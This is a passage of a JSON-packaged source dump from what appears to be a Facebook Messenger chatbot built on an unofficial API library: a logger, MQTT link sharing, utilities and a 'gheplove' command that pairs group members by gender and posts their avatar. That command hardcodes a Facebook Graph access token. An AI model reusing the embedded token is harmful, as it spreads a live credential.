random4)(`‚óÜ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óÜùòõùò¢ùòµùò¥ùò∂ùò†ùòõùòâ‚óÜ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óÜ\\n`)); \n}\nmodule.exports.run = async function ({ api, args, Users, event, Threads, utils, client }) {\n\n}","path":null,"size_bytes":2295,"size_tokens":null},"lib/Fca-Horizon-Remastered/logger.js":{"content":"'use strict';\n/* eslint-disable linebreak-style */\n\nconst chalk = require('chalk');\nvar isHexcolor = require('is-hexcolor');\nvar getText = function(/** @type {string[]} */ ...Data) {\n\tvar Main = (Data.splice(0,1)).toString();\n\t\tfor (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);\n\treturn Main;\n};\n/**\n * @param {any} obj\n */\nfunction getType(obj) {\n    return Object.prototype.toString.call(obj).slice(8, -1);\n}\n\nmodule.exports = {\n\tNormal: function(/** @type {string} */ Str, /** @type {() => any} */ Data ,/** @type {() => void} */ Callback) {\n\t\tif (isHexcolor(global.Fca.Require.FastConfig.MainColor) != true) {\n\t\t\tthis.Warning(getText(global.Fca.Require.Language.Index.InvaildMainColor,global.Fca.Require.FastConfig.MainColor),process.exit(0));\n\t\t}\n\t\telse console.log(chalk.hex(global.Fca.Require.FastConfig.MainColor).bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `) + Str);\n\t\tif (getType(Data) == 'Function' || getType(Data) == 'AsyncFunction') {\n\t\t\treturn Data();\n\t\t}\n\t\tif (Data) {\n\t\t\treturn Data;\n\t\t}\n\t\tif (getType(Callback) == 'Function' || getType(Callback) == 'AsyncFunction') {\n\t\t\tCallback();\n\t\t}\n\t\telse return Callback;\n\t},\n\tWarning: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n\t\tconsole.log(chalk.magenta.bold('[ FCA-WARNING ] > ') + chalk.yellow(str));\n\t\tif (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n\t\t\tcallback();\n\t\t}\n\t\telse return callback;\n\t},\n\tError: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n\t\tif (!str) {\n\t\t\tconsole.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + chalk.red(\"Already Faulty, Please Contact: Facebook.com/Lazic.Kanzu\"));\n\t\t}\n\t\tconsole.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + chalk.red(str));\n\t\tif (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n\t\t\tcallback();\n\t\t}\n\t\telse return callback;\n\t},\n\tSuccess: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n\t\tconsole.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `) + chalk.green(str));\n\t\tif (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n\t\t\tcallback();\n\t\t}\n\t\telse return callback;\n\t},\n\tInfo: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {\n\t\tconsole.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.FastConfig.MainName || '[ FCA-HZI ]'} > `) + chalk.blue(str));\n\t\tif (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {\n\t\t\tcallback();\n\t\t}\n\t\telse return callback;\n\t}\n};","path":null,"size_bytes":2594,"size_tokens":null},"lib/fca-auto/src/shareLink.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareLink(text, url, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tmqttClient.publish('/ls_req',\n\t\t\tJSON.stringify({\n\t\t\t\t\"app_id\": \"2220391788200892\",\n\t\t\t\t\"payload\": JSON.stringify({\n\t\t\t\t\t\ttasks: [{\n\t\t\t\t\t\t\t\tlabel: 46,\n\t\t\t\t\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\t\t\t\t\t\"otid\": utils.generateOfflineThreadingID(),\n\t\t\t\t\t\t\t\t\t\"source\": 524289,\n\t\t\t\t\t\t\t\t\t\"sync_group\": 1,\n\t\t\t\t\t\t\t\t\t\"send_type\": 6,\n\t\t\t\t\t\t\t\t\t\"mark_thread_read\": 0,\n\t\t\t\t\t\t\t\t\t\"url\": url || \"https://www.facebook.com/Lazic.Kanzu\",\n\t\t\t\t\t\t\t\t\t\"text\": text || \"\",\n\t\t\t\t\t\t\t\t\t\"thread_id\": threadID,\n\t\t\t\t\t\t\t\t\t\"initiating_source\": 0\n\t\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\t\tqueue_name: threadID,\n\t\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t\t}],\n\t\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\t\tversion_id: '7191105584331330',\n\t\t\t\t}),\n\t\t\t\t\"request_id\": ++ctx.req_ID,\n\t\t\t\t\"type\": 3\n\t\t\t}),\n\t\t\t{\n\t\t\t\tqos: 1,\n\t\t\t\tretain: false,\n\t\t\t}\n\t\t)\n\t\tctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"shareLink\"\n        });\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1484,"size_tokens":null},"modules/commands/gheplove.js":{"content":"module.exports.config = {\n    name: \"gheplove\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"MewMew fix get by Jukie\",\n    description: \"Gh√©p ƒë√¥i ‚ùóNG·∫™U NHI√äN‚ùó\",\n    commandCategory: \"Nh√≥m\",\n    usages: \"\\nboy => Gh√©p v·ªõi nam\\ngirl => Gh√©p v·ªõi n·ªØ\\nKh√¥ng ghi th√¨ random h·∫øt\",\n    cooldowns: 5\n  }\n  module.exports.run = async ({ api, event,args, Users }) => {\n   const axios = global.nodemodule[\"axios\"];\n    const fs = global.nodemodule[\"fs-extra\"];\n    let mung = [\n    \"Tr√°ch ph·∫≠n v√¥ duy√™n...\",\n  \"H∆°i th·∫•p nh∆∞ng kh√¥ng sao. H√£y c·ªë g·∫Øng l√™n!\",\n  \"3 ph·∫ßn duy√™n n·ª£, 7 ph·∫ßn c·ªë g·∫Øng\",\n  \"T·ª∑ l·ªá m√† m·ªëi quan h·ªá n√†y c√≥ th·ªÉ n√™n duy√™n c≈©ng kh√° l√† nh·ªè ƒë·∫•y! Ph·∫£i c·ªë g·∫Øng h∆°n n·ªØa\",\n  \"Date v·ªõi nhau ƒëi. ƒê·ªÉ m·ªëi quan h·ªá n√†y c√≥ th·ªÉ ti·∫øn xa h∆°n\",\n  \"H√£y ch·ªß ƒë·ªông b·∫Øt chuy·ªán h∆°n n·ªØa. Hai b·∫°n kh√° l√† h·ª£p ƒë√¥i\",\n  \"H√£y tin v√†o duy√™n s·ªë ƒëi, v√¨ n√≥ c√≥ th·∫≠t ƒë·∫•y!\",\n  \"H·ª£p ƒë√¥i l·∫Øm ƒë·∫•y. Quan t√¢m chƒÉm s√≥c cho m·ªëi quan h·ªá n√†y nhi·ªÅu h∆°n n·ªØa nh√©!\",\n  \"L∆∞u s·ªë nhau ƒëi, bao gi·ªù c∆∞·ªõi th√¨ g·ªçi nhau l√™n l·ªÖ ƒë∆∞·ªùng!\",\n  \"C∆∞·ªõi ƒëi ch·ªù chi!\"\n  ]\n  let chuc = mung[Math.floor(Math.random() * mung.length)]\n    if (!args[0]) {\n              var ThreadInfo = await api.getThreadInfo(event.threadID);\n              var all = ThreadInfo.userInfo\n              let data = [];\n              for (let u of all) {\n                  if (u.gender == \"MALE\") {\n                   if ( u != event.senderID) data.push(u.id)   \n                  }\n                  if (u.gender == \"FEMALE\") {\n                    if ( u != event.senderID) data.push(u.id)  \n                }\n              }\n              console.log(data)\n              if (data.length == 0) return api.sendMessage(\"R·∫•t ti·∫øc! Kh√¥ng t√¨m th·∫•y n·ª≠a ƒë·ªùi c·ªßa b·∫°n üò•\", event.threadID, event.messageID);\n              let e = data[Math.floor(Math.random() * data.length)]\n              let a = (Math.random() * 50)+50;\n              var n = (await Users.getData(e)).name\n              const url = api.getCurrentUserID(e);\n           \n  \n              let getAvatar = (await axios.get(`https://graph.facebook.com/${e}/picture?height=1500&width=1500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662\n  `, { responseType: \"arraybuffer\" } )).data; \n              fs.writeFileSync( __dirname + \"/cache/avt.png\", Buffer.from(getAvatar, \"utf-8\") );\n              api.sendMessage({ body: `[üíó]‚Üí Gh√©p ƒë√¥i th√†nh c√¥ng\\n[‚ù§Ô∏è]‚Üí T√™n: ${n}\\n[ü•∞]‚Üí T·ªâ l·ªá h·ª£p ƒë√¥i: ${a.toFixed(2)}%\\n[‚ú®]‚Üí ID: ${e}\\n[üëâ]‚ÜíL·ªùi ch√∫c:\\n${chuc}\\n[üê≥]‚Üí ·∫¢nh c·ªßa ng∆∞·ªùi ƒë√≥:`,\n                    attachment: fs.createReadStream(__dirname + `/cache/avt.png`)\n              }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/avt.png`), event.messageID);\n    }\n    else {            \n      var ThreadInfo = await api.getThreadInfo(event.threadID);\n      var all = ThreadInfo.userInfo\n              let data = [];\n        if(args[0] == \"boy\"){\n              for (let u of all) {\n          if (u.gender == \"MALE\") {\n                  if (u != event.senderID) data.push(u.id)   \n                  }\n              }}  \n       \n        else if(args[0] == \"girl\"){\n              for (let u of all) {\n                  if (u.gender == \"FEMALE\") {\n                  if (u != event.senderID) data.push(u.id)  \n                  }\n              }}\n              console.log(data)\n                       \n              if (data.length == 0) return api.sendMessage(\"‚Üí R·∫•t ti·∫øc! Kh√¥ng t√¨m th·∫•y n·ª≠a ƒë·ªùi c·ªßa b·∫°n üò•\", event.threadID, event.messageID);\n              let e = data[Math.floor(Math.random() * data.length)]\n              let a = (Math.random() * 50)+50;\n              var n = (await Users.getData(e)).name\n              const url = api.getCurrentUserID(e);\n              let getAvatar = (await axios.get(`https://graph.facebook.com/${e}/picture?height=1500&width=1500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662\n  `, { responseType: \"arraybuffer\" } )).data; \n              fs.writeFileSync( __dirname + \"/cache/avt.png\", Buffer.from(getAvatar, \"utf-8\") );\n              api.sendMessage({ body: `[üíó]‚Üí Gh√©p ƒë√¥i th√†nh c√¥ng\\n[‚ù§Ô∏è]‚Üí T√™n: ${n}\\n[ü•∞]‚Üí T·ªâ l·ªá h·ª£p ƒë√¥i: ${a.toFixed(2)}%\\n[‚ú®]‚Üí ID: ${e}\\n[üëâ]‚Üí L·ªùi ch√∫c:\\n${chuc}\\n[üê≥]‚Üí ·∫¢nh c·ªßa ng∆∞·ªùi ƒë√≥:`,\n                    attachment: fs.createReadStream(__dirname + `/cache/avt.png`)\n              }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/avt.png`), event.messageID);}\n  \n  };","path":null,"size_bytes":4660,"size_tokens":null},"main.sh":{"content":"npm start","path":null,"size_bytes":9,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/Database_Test.js":{"content":"const DB = require('../Extra/Database');\nDB().set('a', 'b');\nconsole.log(DB().get('a')); // b\nconsole.log(DB().list());","path":null,"size_bytes":119,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Base/Step_1.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\nmodule.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); };\n\nmodule.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); };","path":null,"size_bytes":325,"size_tokens":null},"lib/Fca-Horizon-Remastered/utils.js":{"content":"// @ts-nocheck\n/* eslint-disable no-undef */\n\n/* eslint-disable no-prototype-builtins */\n\n\"use strict\";\nvar url = require(\"url\");\nvar log = require(\"npmlog\");\nvar stream = require(\"stream\");\nvar bluebird = require(\"bluebird\");\nvar querystring = require(\"querystring\");\nvar request = bluebird.promisify(require(\"request\").defaults({ jar: true }));\n\n/**\n * @param {any} url\n */\n\nfunction setProxy(url) {\n    if (typeof url == \"undefined\") return request = bluebird.promisify(require(\"request\").defaults({ jar: true }));\n    return request = bluebird.promisify(require(\"request\").defaults({ jar: true, proxy: url }));\n}\n\n/**\n * @param {string | URL} url\n * @param {{ userAgent: any; }} options\n * @param {{ region: any; }} [ctx]\n * @param {undefined} [customHeader]\n */\n\nfunction getHeaders(url, options, ctx, customHeader) {\n    var headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        Referer: \"https://www.facebook.com/\",\n        Host: url.replace(\"https://\", \"\").split(\"/\")[0],\n        Origin: \"https://www.facebook.com\",\n        \"user-agent\": (options.userAgent || \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36\"),\n        Connection: \"keep-alive\",\n        \"sec-fetch-site\": 'same-origin',\n        \"sec-fetch-mode\": 'cors'\n    };\n    if (customHeader) Object.assign(headers, customHeader);\n    if (ctx && ctx.region) headers[\"X-MSGR-Region\"] = ctx.region;\n\n    return headers;\n}\n\n/**\n * @param {{ _read: any; _readableState: any; }} obj\n */\n\nfunction isReadableStream(obj) {\n    return (\n        obj instanceof stream.Stream &&\n        (getType(obj._read) === \"Function\" ||\n            getType(obj._read) === \"AsyncFunction\") &&\n        getType(obj._readableState) === \"Object\"\n    );\n}\n\n/**\n * @param {any} url\n * @param {any} jar\n * @param {{ [x: string]: any; fb_dtsg?: any; jazoest?: any; hasOwnProperty?: any; }} qs\n * @param {any} options\n * @param {any} ctx\n */\n\nfunction get(url, jar, qs, options, ctx) {\n    // I'm still confused about this\n    if (getType(qs) === \"Object\")\n        for (var prop in qs)\n            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === \"Object\") qs[prop] = JSON.stringify(qs[prop]);\n    var op = {\n        headers: getHeaders(url, options, ctx),\n        timeout: 60000,\n        qs: qs,\n        url: url,\n        method: \"GET\",\n        jar: jar,\n        gzip: true\n    };\n\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\nfunction post(url, jar, form, options, ctx, customHeader) {\n    var op = {\n        headers: getHeaders(url, options),\n        timeout: 60000,\n        url: url,\n        method: \"POST\",\n        form: form,\n        jar: jar,\n        gzip: true\n    };\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\n/**\n * @param {any} url\n * @param {any} jar\n * @param {{ __user: any; __req: string; __rev: any; __a: number; \n// __af: siteData.features,\nfb_dtsg: any; jazoest: any; }} form\n * @param {{ __user: any; __req: string; __rev: any; __a: number; \n// __af: siteData.features,\nfb_dtsg: any; jazoest: any; }} qs\n * @param {any} options\n * @param {any} ctx\n */\n\nfunction postFormData(url, jar, form, qs, options, ctx) {\n    var headers = getHeaders(url, options, ctx);\n    headers[\"Content-Type\"] = \"multipart/form-data\";\n    var op = {\n        headers: headers,\n        timeout: 60000,\n        url: url,\n        method: \"POST\",\n        formData: form,\n        qs: qs,\n        jar: jar,\n        gzip: true\n    };\n\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\n/**\n * @param {string | number | any[]} val\n * @param {number} [len]\n */\n\nfunction padZeros(val, len) {\n    val = String(val);\n    len = len || 2;\n    while (val.length < len) val = \"0\" + val;\n    return val;\n}\n\n/**\n * @param {any} clientID\n */\n\nfunction generateThreadingID(clientID) {\n    var k = Date.now();\n    var l = Math.floor(Math.random() * 4294967295);\n    var m = clientID;\n    return \"<\" + k + \":\" + l + \"-\" + m + \"@mail.projektitan.com>\";\n}\n\n/**\n * @param {string | any[]} data\n */\n\nfunction binaryToDecimal(data) {\n    var ret = \"\";\n    while (data !== \"0\") {\n        var end = 0;\n        var fullName = \"\";\n        var i = 0;\n        for (; i < data.length; i++) {\n            end = 2 * end + parseInt(data[i], 10);\n            if (end >= 10) {\n                fullName += \"1\";\n                end -= 10;\n            } else fullName += \"0\";\n        }\n        ret = end.toString() + ret;\n        data = fullName.slice(fullName.indexOf(\"1\"));\n    }\n    return ret;\n}\n\nfunction generateOfflineThreadingID() {\n    var ret = Date.now();\n    var value = Math.floor(Math.random() * 4294967295);\n    var str = (\"0000000000000000000000\" + value.toString(2)).slice(-22);\n    var msgs = ret.toString(2) + str;\n    return binaryToDecimal(msgs);\n}\n\nvar h;\nvar i = {};\nvar j = {\n    _: \"%\",\n    A: \"%2\",\n    B: \"000\",\n    C: \"%7d\",\n    D: \"%7b%22\",\n    E: \"%2c%22\",\n    F: \"%22%3a\",\n    G: \"%2c%22ut%22%3a1\",\n    H: \"%2c%22bls%22%3a\",\n    I: \"%2c%22n%22%3a%22%\",\n    J: \"%22%3a%7b%22i%22%3a0%7d\",\n    K: \"%2c%22pt%22%3a0%2c%22vis%22%3a\",\n    L: \"%2c%22ch%22%3a%7b%22h%22%3a%22\",\n    M: \"%7b%22v%22%3a2%2c%22time%22%3a1\",\n    N: \".channel%22%2c%22sub%22%3a%5b\",\n    O: \"%2c%22sb%22%3a1%2c%22t%22%3a%5b\",\n    P: \"%2c%22ud%22%3a100%2c%22lc%22%3a0\",\n    Q: \"%5d%2c%22f%22%3anull%2c%22uct%22%3a\",\n    R: \".channel%22%2c%22sub%22%3a%5b1%5d\",\n    S: \"%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a\",\n    T: \"%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    U: \"%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    V: \"%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a\",\n    W: \"%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a\",\n    X: \"%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1\",\n    Y: \"%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    Z: \"%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a\"\n};\n(function() {\n    var l = [];\n    for (var m in j) {\n        i[j[m]] = m;\n        l.push(j[m]);\n    }\n    l.reverse();\n    h = new RegExp(l.join(\"|\"), \"g\");\n})();\n\n/**\n * @param {string | number | boolean} str\n */\n\nfunction presenceEncode(str) {\n    return encodeURIComponent(str)\n        .replace(/([_A-Z])|%../g, function(m, n) {\n            return n ? \"%\" + n.charCodeAt(0).toString(16) : m;\n        })\n        .toLowerCase()\n        .replace(h, function(m) {\n            return i[m];\n        });\n}\n\n// eslint-disable-next-line no-unused-vars\n/**\n * @param {string} str\n */\n\nfunction presenceDecode(str) {\n    return decodeURIComponent(\n        str.replace(/[_A-Z]/g, function(/** @type {string | number} */m) {\n            return j[m];\n        })\n    );\n}\n\n/**\n * @param {string} userID\n */\n\nfunction generatePresence(userID) {\n    var time = Date.now();\n    return (\n        \"E\" +\n        presenceEncode(\n            JSON.stringify({\n                v: 3,\n                time: parseInt(time / 1000, 10),\n                user: userID,\n                state: {\n                    ut: 0,\n                    t2: [],\n                    lm2: null,\n                    uct2: time,\n                    tr: null,\n                    tw: Math.floor(Math.random() * 4294967295) + 1,\n                    at: time\n                },\n                ch: {\n                    [\"p_\" + userID]: 0\n                }\n            })\n        )\n    );\n}\n\nfunction generateAccessiblityCookie() {\n    var time = Date.now();\n    return encodeURIComponent(\n        JSON.stringify({\n            sr: 0,\n            \"sr-ts\": time,\n            jk: 0,\n            \"jk-ts\": time,\n            kb: 0,\n            \"kb-ts\": time,\n            hcm: 0,\n            \"hcm-ts\": time\n        })\n    );\n}\n\nfunction getGUID() {\n    /** @type {number} */\n\n    var sectionLength = Date.now();\n    /** @type {string} */\n\n    var id = \"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx\".replace(/[xy]/g, function(c) {\n        /** @type {number} */\n\n        var r = Math.floor((sectionLength + Math.random() * 16) % 16);\n        /** @type {number} */\n\n        sectionLength = Math.floor(sectionLength / 16);\n        /** @type {string} */\n\n        var _guid = (c == \"x\" ? r : (r & 7) | 8).toString(16);\n        return _guid;\n    });\n    return id;\n}\n\n/**\n * @param {{ mercury: any; blob_attachment: any; attach_type: any; sticker_attachment: any; extensible_attachment: { story_attachment: { target: { __typename: string; }; }; }; metadata: { stickerID: { toString: () => any; }; packID: { toString: () => any; }; spriteURI: any; spriteURI2x: any; width: any; height: any; frameCount: any; frameRate: any; framesPerRow: any; framesPerCol: any; fbid: { toString: () => any; }; url: any; dimensions: { split: (arg0: string) => any[]; width: any; height: any; }; duration: any; }; url: any; name: any; fileName: any; thumbnail_url: any; preview_url: any; preview_width: any; preview_height: any; large_preview_url: any; large_preview_width: any; large_preview_height: any; share: { share_id: { toString: () => any; }; title: any; description: any; source: any; media: { image: any; image_size: { width: any; height: any; }; playable: any; duration: any; animated_image_size: any; }; subattachments: any; uri: any; target: any; style_list: any; }; }} attachment1\n * @param {{ caption?: any; description?: any; id: any; is_malicious?: any; mime_type?: any; file_size?: any; filename?: any; image_data: any; href?: any; }} [attachment2]\n */\n\nfunction _formatAttachment(attachment1, attachment2) {\n    // TODO: THIS IS REALLY BAD\n    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us\n    // two attachment objects, but sometimes only one. They each contain part of the\n    // data that you'd want so we merge them for convenience.\n    // Instead of having a bunch of if statements guarding every access to image_data,\n    // we set it to empty object and use the fact that it'll return undefined.\n\n    attachment2 = attachment2 || { id: \"\", image_data: {} };\n    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;\n    var blob = attachment1.blob_attachment;\n    var type =\n        blob && blob.__typename ? blob.__typename : attachment1.attach_type;\n    if (!type && attachment1.sticker_attachment) {\n        type = \"StickerAttachment\";\n        blob = attachment1.sticker_attachment;\n    } else if (!type && attachment1.extensible_attachment) {\n        if (\n            attachment1.extensible_attachment.story_attachment &&\n            attachment1.extensible_attachment.story_attachment.target &&\n            attachment1.extensible_attachment.story_attachment.target.__typename &&\n            attachment1.extensible_attachment.story_attachment.target.__typename === \"MessageLocation\"\n        ) type = \"MessageLocation\";\n        else type = \"ExtensibleAttachment\";\n\n        blob = attachment1.extensible_attachment;\n    }\n    // TODO: Determine whether \"sticker\", \"photo\", \"file\" etc are still used\n    // KEEP IN SYNC WITH getThreadHistory\n    switch (type) {\n        case \"sticker\":\n            return {\n                type: \"sticker\",\n                ID: attachment1.metadata.stickerID.toString(),\n                url: attachment1.url,\n\n                packID: attachment1.metadata.packID.toString(),\n                spriteUrl: attachment1.metadata.spriteURI,\n                spriteUrl2x: attachment1.metadata.spriteURI2x,\n                width: attachment1.metadata.width,\n                height: attachment1.metadata.height,\n\n                caption: attachment2.caption,\n                description: attachment2.description,\n\n                frameCount: attachment1.metadata.frameCount,\n                frameRate: attachment1.metadata.frameRate,\n                framesPerRow: attachment1.metadata.framesPerRow,\n                framesPerCol: attachment1.metadata.framesPerCol,\n\n                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy\n                spriteURI: attachment1.metadata.spriteURI, // @Legacy\n                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy\n            };\n        case \"file\":\n            return {\n                type: \"file\",\n                filename: attachment1.name,\n                ID: attachment2.id.toString(),\n                url: attachment1.url,\n\n                isMalicious: attachment2.is_malicious,\n                contentType: attachment2.mime_type,\n\n                name: attachment1.name, // @Legacy\n                mimeType: attachment2.mime_type, // @Legacy\n                fileSize: attachment2.file_size // @Legacy\n            };\n        case \"photo\":\n            return {\n                type: \"photo\",\n                ID: attachment1.metadata.fbid.toString(),\n                filename: attachment1.fileName,\n                thumbnailUrl: attachment1.thumbnail_url,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                largePreviewUrl: attachment1.large_preview_url,\n                largePreviewWidth: attachment1.large_preview_width,\n                largePreviewHeight: attachment1.large_preview_height,\n\n                url: attachment1.metadata.url, // @Legacy\n                width: attachment1.metadata.dimensions.split(\",\")[0], // @Legacy\n                height: attachment1.metadata.dimensions.split(\",\")[1], // @Legacy\n                name: attachment1.fileName // @Legacy\n            };\n        case \"animated_image\":\n            return {\n                type: \"animated_image\",\n                ID: attachment2.id.toString(),\n                filename: attachment2.filename,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                url: attachment2.image_data.url,\n                width: attachment2.image_data.width,\n                height: attachment2.image_data.height,\n\n                name: attachment1.name, // @Legacy\n                facebookUrl: attachment1.url, // @Legacy\n                thumbnailUrl: attachment1.thumbnail_url, // @Legacy\n                mimeType: attachment2.mime_type, // @Legacy\n                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy\n                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy\n                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy\n                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy\n                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy\n                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy\n            };\n        case \"share\":\n            return {\n                type: \"share\",\n                ID: attachment1.share.share_id.toString(),\n                url: attachment2.href,\n\n                title: attachment1.share.title,\n                description: attachment1.share.description,\n                source: attachment1.share.source,\n\n                image: attachment1.share.media.image,\n                width: attachment1.share.media.image_size.width,\n                height: attachment1.share.media.image_size.height,\n                playable: attachment1.share.media.playable,\n                duration: attachment1.share.media.duration,\n\n                subattachments: attachment1.share.subattachments,\n                properties: {},\n\n                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy\n                facebookUrl: attachment1.share.uri, // @Legacy\n                target: attachment1.share.target, // @Legacy\n                styleList: attachment1.share.style_list // @Legacy\n            };\n        case \"video\":\n            return {\n                type: \"video\",\n                ID: attachment1.metadata.fbid.toString(),\n                filename: attachment1.name,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                url: attachment1.url,\n                width: attachment1.metadata.dimensions.width,\n                height: attachment1.metadata.dimensions.height,\n\n                duration: attachment1.metadata.duration,\n                videoType: \"unknown\",\n\n                thumbnailUrl: attachment1.thumbnail_url // @Legacy\n            };\n        case \"error\":\n            return {\n                type: \"error\",\n\n                // Save error attachments because we're unsure of their format,\n                // and whether there are cases they contain something useful for debugging.\n                attachment1: attachment1,\n                attachment2: attachment2\n            };\n        case \"MessageImage\":\n            return {\n                type: \"photo\",\n                ID: blob.legacy_attachment_id,\n                filename: blob.filename,\n                thumbnailUrl: blob.thumbnail.uri,\n\n                previewUrl: blob.preview.uri,\n                previewWidth: blob.preview.width,\n                previewHeight: blob.preview.height,\n\n                largePreviewUrl: blob.large_preview.uri,\n                largePreviewWidth: blob.large_preview.width,\n                largePreviewHeight: blob.large_preview.height,\n\n                url: blob.large_preview.uri, // @Legacy\n                width: blob.original_dimensions.x, // @Legacy\n                height: blob.original_dimensions.y, // @Legacy\n                name: blob.filename // @Legacy\n            };\n        case \"MessageAnimatedImage\":\n            return {\n                type: \"animated_image\",\n                ID: blob.legacy_attachment_id,\n                filename: blob.filename,\n\n                previewUrl: blob.preview_image.uri,\n                previewWidth: blob.preview_image.width,\n                previewHeight: blob.preview_image.height,\n\n                url: blob.animated_image.uri,\n                width: blob.animated_image.width,\n                height: blob.animated_image.height,\n\n                thumbnailUrl: blob.preview_image.uri, // @Legacy\n                name: blob.filename, // @Legacy\n                facebookUrl: blob.animated_image.uri, // @Legacy\n                rawGifImage: blob.animated_image.uri, // @Legacy\n                animatedGifUrl: blob.animated_image.uri, // @Legacy\n                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy\n                animatedWebpUrl: blob.animated_image.uri, // @Legacy\n                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy\n            };\n        case \"MessageVideo\":\n            return {\n                type: \"video\",\n                filename: blob.filename,\n                ID: blob.legacy_attachment_id,\n\n                previewUrl: blob.large_image.uri,\n                previewWidth: blob.large_image.width,\n                previewHeight: blob.large_image.height,\n\n                url: blob.playable_url,\n                width: blob.original_dimensions.x,\n                height: blob.original_dimensions.y,\n\n                duration: blob.playable_duration_in_ms,\n                videoType: blob.video_type.toLowerCase(),\n\n                thumbnailUrl: blob.large_image.uri // @Legacy\n            };\n        case \"MessageAudio\":\n            return {\n                type: \"audio\",\n                filename: blob.filename,\n                ID: blob.url_shimhash,\n\n                audioType: blob.audio_type,\n                duration: blob.playable_duration_in_ms,\n                url: blob.playable_url,\n\n                isVoiceMail: blob.is_voicemail\n            };\n        case \"StickerAttachment\":\n            return {\n                type: \"sticker\",\n                ID: blob.id,\n                url: blob.url,\n\n                packID: blob.pack ? blob.pack.id : null,\n                spriteUrl: blob.sprite_image,\n                spriteUrl2x: blob.sprite_image_2x,\n                width: blob.width,\n                height: blob.height,\n\n                